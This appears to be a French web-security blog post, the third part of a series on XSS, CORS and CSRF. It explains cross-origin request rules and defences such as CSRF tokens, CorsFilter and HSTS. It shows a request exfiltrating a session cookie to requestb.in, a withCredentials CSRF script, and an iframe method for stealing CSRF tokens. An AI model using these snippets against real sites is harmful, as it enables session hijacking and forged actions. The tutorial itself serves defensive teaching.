I"ˆN<h3 id="les-requÃªtes-cross-site">Les requÃªtes Cross-Site.</h3>

<p>Bienvenue dans ce dernier volet de notre Saga XSS (<a href="http://localhost:4000/xss-cors-csrf-partie-1-xss">partie 1</a>, <a href="http://localhost:4000/xss-cors-csrf-partie-2-xss-cookies-session">partie 2</a>).</p>

<p>Dans notre prÃ©cÃ©dent article nous avions rÃ©cupÃ©rÃ© un cookie de session insuffisamment sÃ©curisÃ© grÃ¢ce Ã  une vulnÃ©rabilitÃ© XSS. Vous Ã©tiez nombreux dans ma tÃªte Ã  me demander pourquoi ce message dâ€™erreur (ici Chrome mais le fonctionnement est identique sous IE, Firefox) :</p>

<pre class="alert">
XMLHttpRequest cannot load http://requestb.in/w7iy5sw7?cookie=PHPSESSID_unsecured=jm5mah0a9uuf4g344096nled73. No 'Access-Control-Allow-Origin' header is present on the requested resource. Origin 'http://localhost' is therefore not allowed access.
</pre>
<!--more-->
<p><br />
Alors que nous avions bien rÃ©ceptionnÃ© notre requÃªte sur requestb.in :</p>

<p><img src="http://localhost:4000/public/images/cors-csrf/cors_1.png" alt="Cross-Origin simple" /><br />
Et bien nous sommes dans le cas dâ€™une <strong>requÃªte simple Cross-origin</strong> :</p>

<blockquote>
  <p><em>Le Cross-origin resource sharing (CORS) est un mÃ©canisme qui permet Ã  des ressources restreintes dâ€™une page web dâ€™Ãªtre requÃªtÃ©es par un autre domaine que celui de la ressource en question</em>.</p>
</blockquote>

<p>Comme stipulÃ© sur le site de Mozilla :</p>

<p><em>Le standard de partage de ressources dâ€™origines croisÃ©es fonctionne grÃ¢ce Ã  lâ€™ajout dâ€™entÃªtes HTTP qui permettent aux serveurs de dÃ©crire lâ€™ensemble des origines permises. Câ€™est ensuite le navigateur qui lit cette information et en fait lâ€™usage adÃ©quat. Par ailleurs, pour les requÃªtes HTTP dont les mÃ©thodes pourraient avoir des effets secondaires sur les donnÃ©es utilisateur (non idempotentes - en particulier pour les mÃ©thodes HTTP autres que GET, ou pour lâ€™utilisation du POST avec certains types MIME), la spÃ©cification mandate les navigateurs de â€œprÃ©-vÃ©rifierâ€ la requÃªte en sollicitant le serveur pour connaÃ®tre les mÃ©thodes approuvÃ©es. Cette prÃ©-vÃ©rification sâ€™effectue avec la mÃ©thode HTTP OPTIONS, et ensuite, aprÃ¨s â€œapprobationâ€ du serveur, envoie la requÃªte vÃ©ritable. Les serveurs peuvent aussi notifier les clients des informations pouvant Ãªtre associÃ©es aux requÃªtes cross-origin (incluant les cookies et les donnÃ©es dâ€™authentification HTTP).</em></p>

<p>Dans notre exemple de requÃªte simple cross-origin, le domaine de la ressource ayant initiÃ© la requÃªte (<strong>http://localhost:80</strong>) Ã©tant diffÃ©rent du domaine requÃªtÃ© (<strong>http://requestb.in:80</strong>), notre navigateur dÃ©tecte une requÃªte <strong>CORS</strong> (lâ€™origine est reprÃ©sentÃ©e par <strong>protocole://domaine:port</strong>). Pour connaitre le comportement Ã  adopter, le navigateur attend dans la rÃ©ponse un header <strong>Access-Control-Allow-Origin</strong> qui nous informe sur lâ€™autorisation dâ€™accÃ¨s ou non Ã  la ressource. Le comportement par dÃ©faut en lâ€™absence dâ€™un tel header est de considÃ©rer lâ€™opÃ©ration comme <strong>DONE</strong> (xhr.readyState == 4) mais de retourner un statut <strong>UNSENT/OPENED</strong> (xhr.status == 0). Nous ne pourrons donc pas accÃ©der au contenu de notre rÃ©ponse.</p>

<p>Cependant nous remarquons que sans filtre explicite cotÃ© serveur et en dÃ©lÃ©guant la sÃ©curitÃ© au navigateur (absence par dÃ©faut du header Access-Control-Allow-Origin), la requÃªte a Ã©tÃ© correctement traitÃ©e cotÃ© serveur. Ceci ne sera pas le cas avec les requÃªtes prÃ©-vÃ©rifiÃ©es.</p>

<p><strong>RequÃªte simple</strong> :</p>

<p>Une requÃªte cross-site simple est une requÃªte qui:</p>

<ul>
  <li>Utilise les mÃ©thodes HTTP GET, HEAD ou POST. Si POST est utlisÃ© pour envoyer des donnÃ©es au serveur le Content-Type des donnÃ©es envoyÃ© au serveur est soit application/x-www-form-urlencoded, multipart/form-data, ou text/plain.</li>
  <li>Ne positionne pas dâ€™entÃªtes personnalisÃ©s avec la requÃªte HTTP Request (comme par exemple X-Modified, etc.).</li>
</ul>

<p><strong>RequÃªte prÃ©-vÃ©rifiÃ©e</strong> :</p>

<p>Une requÃªte est prÃ©vÃ©rifiÃ©e si :</p>

<ul>
  <li>Elle utilise des mÃ©thodes autres que GET, HEAD ou POST.  Aussi, si POST est utilisÃ©e pour envoyer des requÃªtes de donnÃ©es avec un Content-Type autre que application/x-www-form-urlencoded, multipart/form-data, ou text/plain, par exemple si la requÃªte POST envoie au serveur un contenu utile XML en utilisant application/xml ou text/xml, alors la requÃªte est prÃ©-vÃ©rifiÃ©e.</li>
  <li>Elle positionne des entÃªtes propres (ex: la requÃªte utilise une entÃªte comme X-PINGOTHER).</li>
</ul>

<p>Vous trouverez un trÃ¨s bon exemple de requÃªte CORS prÃ©flight <a href="https://developer.mozilla.org/fr/docs/HTTP/Access_control_CORS#Requ.C3.AAtes_pr.C3.A9-v.C3.A9rifi.C3.A9es">ici</a>.</p>

<p>Le serveur nous retournera tous les headers nÃ©cessaires pour informer le client des autorisations Cross-Origin. Encore une fois inutile de faire du copier/coller, vous trouvez la liste de ces headers response <a href="https://developer.mozilla.org/fr/docs/HTTP/Access_control_CORS#Les_ent.C3.AAtes_HTTP_de_r.C3.A9ponse">ici</a>. Certains <a href="https://developer.mozilla.org/fr/docs/HTTP/Access_control_CORS#Les_ent.C3.AAtes_HTTP_de_la_requ.C3.AAte">request headers</a> sont automatiquement positionnÃ©s par le navigateur.</p>

<p>Vous ne pourrez pas agir sur les request headers CORS, si vous tentez ce genre dâ€™opÃ©rations :</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">Origin</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">http://requestb.in</span><span class="dl">'</span><span class="p">);</span>
<span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">Referer</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">http://requestb.in/11hlgzo1</span><span class="dl">'</span><span class="p">);</span>
</code></pre></div></div>
<p>Vous aurez un joli message sous Chrome et le navigateur positionnera lui-mÃªme ces entÃªtes (comportement identique sous Firefox et IE, seuls les messages dâ€™erreur diffÃ¨rent):</p>
<pre class="alert">
Refused to set unsafe header "Origin"  
Refused to set unsafe header "Referer"  
</pre>
<p><br />
La premiÃ¨re chose pour un site souhaitant faire du CORS est de bien positionner les origines autorisÃ©es avec le header <strong>Access-Control-Allow-Origin</strong>. Ce dernier doit stipuler explicitement les origines autorisÃ©es pour bÃ©nÃ©ficier pleinement de lâ€™utilisation des XHR (rappelons que lâ€™utilisation de ces headers concernent les XmlHttpRequest, une iframe par exemple nâ€™Ã©mettra pas de header Origin et sera soumise Ã  la <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy#Changing_origin">Same Origin Policy</a>).</p>

<p>Cependant <code class="language-plaintext highlighter-rouge">Access-Control-Allow-Origin: *</code> : toutes les origines peuvent accÃ©der Ã  la ressource. La restriction concernant lâ€™utilisation du wildcard est que les rÃ©ponses des requÃªtes XHR <strong>withCredentials</strong> ne pourront pas Ãªtre lues pour des raisons de sÃ©curitÃ©, <strong>mÃªme si le serveur positionne le header <code class="language-plaintext highlighter-rouge">Access-Control-Allow-Credentials: true</code></strong>. Imaginons que toutes les conditions soient remplies; un pirate pourrait coder depuis son site (ou Ã  partir dâ€™une XSS) une succession de requÃªtes cross-origin incluant les credentials de lâ€™utilisateur et effectuer des actions Ã  son insu (la lecture des rÃ©ponses withCredentials implique donc une origine explicitement autorisÃ©e par le serveur et un Access-Control-Allow-Credentials: true):</p>

<p><img src="http://localhost:4000/public/images/cors-csrf/cors_2.png" alt="Schema attaque CORS" /></p>

<p>Comme nous lâ€™avons vu, en lâ€™absence de ce header, le navigateur bloquera lâ€™accÃ¨s Ã  la rÃ©ponse. Cependant cette <strong>requÃªte simple CORS POST <a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/withCredentials">withCredentials</a></strong> sera interprÃ©tÃ©e sur le serveur si ce dernier ne possÃ¨de pas de filtre CORS explicite (Ã  partir dâ€™un site malicieux, les requÃªtes GET, POST gÃ©nÃ©rÃ©es Ã  partir dâ€™Ã©lÃ©ments HTML enverront le cookie dans la requÃªte. Sur de lâ€™Ajax il faut rajouter la clause withCredentials = true).</p>

<p>Pour cet exemple, nous avons crÃ©Ã© une page <strong>http://localhost/secu/cookie.html</strong>:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
	<span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
	<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">POST</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">http://requestb.in/11hlgzo1</span><span class="dl">'</span><span class="p">);</span>
	<span class="nx">xhr</span><span class="p">.</span><span class="nx">withCredentials</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
	<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="dl">'</span><span class="s1">op=exaction</span><span class="dl">'</span><span class="p">);</span>
<span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<p>Au prÃ©alable nous nous sommes connectÃ©s sur <strong>requestb.in</strong>. Ce site initialise plusieurs cookies dont le suivant :</p>

<p><img src="http://localhost:4000/public/images/cors-csrf/cors_3.png" alt="Cookie requestb.in" /><br />
Nous remarquons un cookie sÃ©curisÃ©, donc impossible dâ€™y accÃ©der via <strong>document.cookie</strong>. Cependant <strong>withCredentials</strong> inclut automatiquement les cookies dans la requÃªte (<em>Update 14/05/2017: validÃ© Ã  nouveau sur Chrome v56, cependant le comportement nâ€™est pas reproductible sur ma Kali sur des versions Firefox ESR v45.3 et Chromium v53</em>).</p>

<p>VÃ©rifions lâ€™Ã©xecution du payload sur request.bin :</p>

<p><img src="http://localhost:4000/public/images/cors-csrf/cors_4.png" alt="RÃ©sultat request.bin" /><br />
Un petit tour du cÃ´tÃ© de la console :</p>
<pre class="alert">
XMLHttpRequest cannot load http://requestb.in/11hlgzo1. No 'Access-Control-Allow-Origin' header is present on the requested resource. Origin 'http://localhost' is therefore not allowed access
</pre>
<p><br />
Et de la rÃ©ponse :</p>

<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Date</span><span class="p">:</span> <span class="s">Sat, 20 Aug 2016 14:41:21 GMT</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=utf-8</span>
<span class="na">Sponsored-By</span><span class="p">:</span> <span class="s">https://www.runscope.com</span>
<span class="na">Set-Cookie</span><span class="p">:</span> <span class="s">session=eyJyZWNlbnQiOlsiMTFobGd6bzEiLCIxNzRzOGR3MSJdfQ.Cpn9kQ.ouuFFtBlOyU9cX5aymJeDrg57gQ; HttpOnly; Path=/</span>
<span class="na">Via</span><span class="p">:</span> <span class="s">1.1 vegur</span>
<span class="na">Server</span><span class="p">:</span> <span class="s">cloudflare-nginx</span>
<span class="na">CF-RAY</span><span class="p">:</span> <span class="s">2d569b0e05cb0914-CDG</span>
<span class="na">Content-Encoding</span><span class="p">:</span> <span class="s">gzip</span>
<span class="na">Transfer-Encoding</span><span class="p">:</span> <span class="s">chunked</span>
</code></pre></div></div>

<p>Lâ€™objet de cette attaque est donc de transmettre Ã  un utilisateur authentifiÃ© une requÃªte HTTP falsifiÃ©e qui pointe sur une action interne au site (www.site-de-confiance.com), afin quâ€™il lâ€™exÃ©cute sans en avoir conscience et en utilisant ses propres droits. Il sâ€™agit dâ€™une attaque <strong>Cross-Site Request Forgery</strong>. Ici nous nâ€™utilisons pas de faille XSS car tout se passe sur le site du pirate.</p>

<p><strong>Comment Ã©viter ce type dâ€™attaque CSRF?</strong></p>

<p>Lâ€™application doit positionner dans les formulaires un <strong>jeton alÃ©atoire unique</strong> non prÃ©dictible par lâ€™assaillant (nonce). Ainsi lors dâ€™une soumission sur www.site-de-confiance.com, le serveur vÃ©rifiera si ce jeton est prÃ©sent et si il est valide. Demandez Ã©galement des confirmations sur vos actions critiques (exemple demande de lâ€™ancien mot de passe si ce dernier doit Ãªtre changÃ©).</p>

<p>Vous trouverez sur <a href="https://github.com/phackt/DemoWebApp">https://github.com/phackt/DemoWebApp</a> la protection <strong>CSRF</strong> activÃ©e par dÃ©faut avec <strong>Spring Security</strong>. Je vous recommande de lire la <a href="http://docs.spring.io/spring-security/site/docs/current/reference/html/csrf.html">documentation</a> si vous utilisez ce framework dans votre web app Java.</p>

<p>Voici par exemple ce qui est gÃ©nÃ©rÃ© dans un formulaire :</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;form</span> <span class="na">id=</span><span class="s">"idFilesUploadForm"</span> <span class="na">action=</span><span class="s">"uploadFile"</span> <span class="na">method=</span><span class="s">"POST"</span> <span class="na">enctype=</span><span class="s">"multipart/form-data"</span><span class="nt">&gt;</span>
	...
	<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"_csrf"</span> <span class="na">value=</span><span class="s">"400a3ca2-4a8e-4c2e-b248-9d60a0e112b5"</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;/form&gt;</span>
</code></pre></div></div>

<p>Vous vous demandez peut Ãªtre si nous pouvons contourner ce token sur un site vulnÃ©rable au XSS. Rappelez-vous notre <a href="http://localhost:4000/xss-cors-csrf-partie-2-xss-cookies-session#iframe">payload</a> dans notre prÃ©cÃ©dent article et le response header <strong>X-Frame-Options</strong>â€¦ Si cet header est absent rien ne nous empÃªche sur le site www.site-de-confiance.com de charger notre page dans une <strong>iframe</strong>, de rÃ©cupÃ©rer le token et de le soumettre pour effectuer une action malveillante.</p>

<p>Il est Ã©galement important de dÃ©finir une politique CORS <strong>cotÃ© serveur</strong>. Nous pouvons tout simplement renvoyer un code <code class="language-plaintext highlighter-rouge">403 â€“ Forbidden</code> pour les cross-origin en implÃ©mentant un <strong>CORS Filter</strong>. A partir de Tomcat 7 vous pouvez utiliser le filtre <a href="https://tomcat.apache.org/tomcat-8.0-doc/config/filter.html#CORS_Filter">CorsFilter</a> dans votre chaine de filtres (fichier web.xml) :</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;filter&gt;</span>
	<span class="nt">&lt;filter-name&gt;</span>CorsFilter<span class="nt">&lt;/filter-name&gt;</span>
	<span class="nt">&lt;filter-class&gt;</span>org.apache.catalina.filters.CorsFilter<span class="nt">&lt;/filter-class&gt;</span>
	<span class="nt">&lt;init-param&gt;</span>
		<span class="nt">&lt;param-name&gt;</span>cors.allowed.origins<span class="nt">&lt;/param-name&gt;</span>
		<span class="nt">&lt;param-value&gt;</span>http://mondomain<span class="nt">&lt;/param-value&gt;</span>
	<span class="nt">&lt;/init-param&gt;</span>
<span class="nt">&lt;/filter&gt;</span>
<span class="nt">&lt;filter-mapping&gt;</span>
	<span class="nt">&lt;filter-name&gt;</span>CorsFilter<span class="nt">&lt;/filter-name&gt;</span>
	<span class="nt">&lt;url-pattern&gt;</span>/*<span class="nt">&lt;/url-pattern&gt;</span>
<span class="nt">&lt;/filter-mapping&gt;</span>
</code></pre></div></div>

<p>Vous trouvez le flowchart du filtre <a href="http://tomcat.apache.org/tomcat-8.0-doc/images/cors-flowchart.png">ici</a>.
<strong>Ceci interdit donc en amont lâ€™accÃ¨s Ã  toute requÃªte cross-origin.</strong></p>

<p><strong>Quid des frameworks pour dÃ©velopper des clients riches comme Angular ou React</strong> ?<br />
Au vu de la multiplicitÃ© des requÃªtes asynchrones, il convient de positionner un token CSRF unique (Ã  Ã©viter en tant que cookie car devra Ãªtre en httpOnly pour des requÃªtes xhr), et de rajouter ce token en tant que header (exemple X-XSRF-TOKEN: a0ed8d95-5694-4b77-853c-b04677677722) dans la requÃªte, header qui sera vÃ©rifiÃ© cotÃ© serveur. Cet en-tÃªte non standard permet Ã©galement le dÃ©clenchement dâ€™une requÃªte prÃ©liminaire (OPTIONS) pour vÃ©rifier si lâ€™origine de la requÃªte est autorisÃ©Ã©.<br />
<br />
<strong>Conclusion :</strong></p>

<p>Nous avons vu que les vecteurs dâ€™attaques sont multiples sur les applications Web. Vous devez mettre en place toutes les mesures pour sÃ©curiser les sessions de vos utilisateurs (assainissement des input, response headers de sÃ©curitÃ©, sÃ©curisation des cookies, token CSRF, bannissement du CORS cÃ´tÃ© serveur). Eprouvez votre application avec les outils nÃ©cessaires (<a href="https://www.owasp.org/index.php/OWASP_Xenotix_XSS_Exploit_Framework">Xenotix</a>), regardez quels sont les headers envoyÃ©s et reÃ§us directement dans votre navigateur ou grÃ¢ce Ã  un proxy comme <a href="https://portswigger.net/burp/">Burp Suite</a> ou <a href="https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project">Owasp ZAP</a>.</p>

<p>Nous verrons dans un prochain article comment utiliser les techniques vu prÃ©cÃ©demment dans une attaque Man In The Middle. Imaginez quâ€™un pirate se positionne entre vous et le site web : toutes les protections abordÃ©es prÃ©cÃ©demment seront indispensables pour Ã©viter lâ€™interception en clair de votre trafic et le vol de vos sessions. Pensez Ã  lâ€™injection dâ€™un payload Javascript dans une ressource quelconque non sÃ©curisÃ©e qui effectuerait une requÃªte <strong>cross-site withCredentials</strong> sur du <strong>HTTP</strong> (non over SSL - ceci possible si cookie avec le flag <strong>Secure</strong> absent)â€¦</p>

<p><a name="hsts"></a>Câ€™est Ã  ce niveau que le response header <a href="https://https.cio.gov/hsts/">HSTS</a> est primordial, car une ressource en cache dans le navigateur ayant le HSTS de positionnÃ© indiquera au navigateur que toute requÃªte sur le domaine de cette ressource fera lâ€™objet dâ€™une redirection interne (307 Internal Redirect). Nous aborderons ce cas pratique identifiÃ© sur un site pour montrer que la protection HSTS est ici le dernier recours au vol de session lors dâ€™une attaque MITM si le cookie nâ€™est pas sÃ©curisÃ© (flag <strong>Secure</strong>). Ceci nous prouve que chaque protection doit Ãªtre mise en place pour contrecarrer toutes les combinaisons dâ€™attaques.</p>

<p>A bientÃ´t.
<br />
<br />
RÃ©fÃ©rences :<br />
<a href="https://developer.mozilla.org/fr/docs/HTTP/Access_control_CORS">https://developer.mozilla.org/fr/docs/HTTP/Access_control_CORS</a><br />
<a href="https://www.w3.org/TR/cors/">https://www.w3.org/TR/cors/</a><br />
<a href="https://fr.wikipedia.org/wiki/Cross-Site_Request_Forgery">https://fr.wikipedia.org/wiki/Cross-Site_Request_Forgery</a><br />
<a href="https://tomcat.apache.org/tomcat-8.0-doc/config/filter.html">https://tomcat.apache.org/tomcat-8.0-doc/config/filter.html</a></p>
:ET